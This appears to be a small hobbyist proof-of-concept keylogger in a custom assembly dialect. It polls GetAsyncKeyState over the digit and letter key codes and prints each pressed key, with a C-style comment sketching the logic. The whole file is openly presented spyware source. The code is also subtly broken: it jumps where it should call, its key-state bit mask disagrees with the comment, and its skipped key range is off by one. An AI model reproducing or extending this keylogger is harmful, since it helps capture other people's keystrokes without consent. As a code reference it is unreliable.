; Simple PASM keylogger POC
; by patate

; //https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes

; -----------------------------------
; Keys 0 to 9 and A to Z
; -----------------------------------
; for (int i = 48; i < 91; i++) {
;     if (i >= 58 && i <= 64) {
;       continue;
;     }
;     if (GetAsyncKeyState(i) & 0x8000) {
;       printf("%c", i);
;     }
; }

; https://stackoverflow.com/a/18670716
; note about returns : you can directly call ret from a je/jne/ja/jna/jb/jnb with "jb return".
;                      so return cannot be used as a label.
check:
cmp a1, 57
jb return ; if <

cmp a1, 63
ja return ; if >

mov eax, 1
ret

inc_and_numbers:
add a1, 1
jmp numbers

main:

mov a1, 47 ;set a1 to 47

numbers:
cmp a1, 90
je main ; if ==

jmp check
cmp eax, 1
je inc_and_numbers

add a1, 1 ; i++

push a1 ; arg 1 (vKey)
call GetAsyncKeyState
and eax, 1
cmp eax, 0
je numbers ; if GetAsyncKeyState was false, jump to numbers

push a1 ; push char
call put
jmp numbers
